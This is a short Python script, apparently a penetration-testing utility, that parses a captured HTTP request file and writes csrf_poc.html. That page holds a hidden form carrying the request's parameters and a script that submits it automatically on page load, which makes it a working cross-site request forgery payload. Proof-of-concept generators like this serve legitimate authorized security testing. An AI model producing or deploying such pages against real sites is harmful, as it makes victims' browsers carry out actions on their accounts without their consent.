#!/usr/bin/env python3
import urllib.parse
import html
from jinja2 import Template
import sys
def find_http_method(text):
    first_line = text.split('\n', 1)[0]
    if('GET' in text):
        return "GET"
    if('POST' in text):
        return "POST"
def find_request_url(text,method):
    protocol='https' # set http or https
    first_line = text.split('\n', 1)[0]
    hostname=(text.split("Host: ",1)[1].split("\n")[0])
    if(method=="GET"):
        path=first_line.split(" ", 1)[1].split("?")[0]
    if(method=="POST"):
        path=first_line.split(" ", 1)[1].split(" ")[0]
    return(protocol+'://'+hostname+path)
def find_http_parameters(text,method):
    first_line = text.split('\n', 1)[0]
    if(method=="POST"):
        last_line = text.split('\n\n', 1)[1]
        params=last_line.split("&")
    if(method=="GET"):
        params_temp=first_line.split("?")[1].split(" ")
        params = params_temp[0].split("&")
    params_array_new = []
    for param in params:
        for key in param.split(', '):
            if '=' in key:
                params_array_new.append(map(str.strip, key.split('=', 1)))
    params_dict = dict(params_array_new)
    return(params_dict)
try:
    filename=sys.argv[1]
except:
    print("Usage: python3 csrf_poc.py <request_file>")
    sys.exit()
with open(filename,'r') as file:
    imported_file = file.read().rstrip()
    file_str=urllib.parse.unquote(imported_file)
url=(find_request_url(file_str,find_http_method(file_str)))
params=(find_http_parameters(file_str,find_http_method(file_str)))
html_template = Template('''<html>
<body>
<form action="{{url}}" method="{{method}}">
{% for key, value in params.items() %}
<input type="hidden" name="{{key}}" value="{{value}}" />
{% endfor %}
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
''')
output = html_template.render(url=url,method=find_http_method(file_str),params=params)
f = open("csrf_poc.html", "w")
f.write(output)
f.close()
